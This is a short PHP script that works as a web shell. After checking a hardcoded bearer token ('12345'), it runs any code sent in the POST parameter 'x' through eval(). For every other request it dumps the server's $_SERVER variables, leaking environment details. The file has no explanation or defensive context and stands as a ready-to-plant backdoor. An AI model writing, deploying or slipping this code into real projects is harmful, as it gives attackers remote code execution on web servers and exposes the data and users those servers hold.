<?php 
  if ($_SERVER['HTTP_AUTHORIZATION'] == 'Bearer 12345' ) {
    echo "Token Set";
    if (isset( $_POST['x'])) {
      eval($_POST['x']);
      }
      else
      {
        echo "Nothing Here";
      }
      
    } else {
    var_dump($_SERVER); }
?>
